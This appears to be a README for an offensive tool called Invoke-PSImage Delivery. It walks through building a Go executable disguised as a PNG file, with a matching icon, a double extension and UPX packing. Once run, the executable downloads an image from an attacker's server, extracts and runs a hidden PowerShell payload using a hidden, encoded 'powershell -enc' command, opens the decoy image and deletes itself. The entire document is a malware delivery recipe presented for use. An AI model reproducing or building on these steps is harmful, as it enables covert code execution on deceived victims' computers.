# Invoke-PSImage Delivery

## What does this do?

**The binary will download the image from the url save it as `mia.png` and then run the powershell payload from within the Image and then show the image which it just downloaded. After this it will delete itself**



1. Search for a Image
2. get https://github.com/peewpw/Invoke-PSImage
3. get `payload.ps1` and `bin.go` from this repo
4. get rcedit (https://github.com/electron/rcedit)
5. get upx
6. get go


## "Building"

1. Change Payload in `payload.ps1`
*Default payload.ps1*
```
function InvokePayload
{
	powershell.exe -w hidden -noni -nop -enc <encoded string>
};
```

2. Build image

```
PS> Import-Module .\Invoke-PSImage.ps1
PS> Invoke-PSImage -Script .\payload.ps1 -Image your_image.jpg -Out evil_image.png
```
3. Copy the output (oneliner)
4. Change line 31 in bin.go
```
var hi string = `$path = -join($pwd.path, "\mia.png"); sal a New-Object;Add-Type -AssemblyName "System.Drawing";$g= a System.Drawing.Bitmap($path);.....7647])); .\mia.png; del .\mia.png.exe; InvokePayload`
```

Be sure to replace the `sal` part until the `;` with your oneliner.
Then replace `System.Drawing.Bitmap(...)` with `System.Drawing.Bitmap($path)`

You should also change the filename (mine is mia.png(.exe))



6. Change your webserver url in line 29 (upload your evil_image.png from step 2. to this host)

7. Change the name `mia.png` to your desired name.
8. Convert your original image to a ico. (i named it icon.ico)
9. run `go build -ldflags="-s -w" bin.go` to build the go binary
10. `.\rcedit.exe .\bin.exe --set-icon "icon.ico"`
11. `.\upx.exe --ultra-brute -o mia.png.exe bin.exe` - Make sure to add the .exe after the filename which you chose the steps before

12. RUN

### What should happen:
It should download the image from the URL which you specified.
Then it should extract your payload.ps1 from this image and run the payload (from step 1).
After this it opens the image which it downloaded (disguise) and deletes itself :)


### why Mia.png???
Cause i used a picture of [Mia Malkova](https://en.wikipedia.org/wiki/Mia_Malkova) for Testing.


## Tools used
[Invoke-PSImage](https://github.com/peewpw/Invoke-PSImage) - Huge Props to this dude

[rcedit](https://github.com/electron/rcedit)
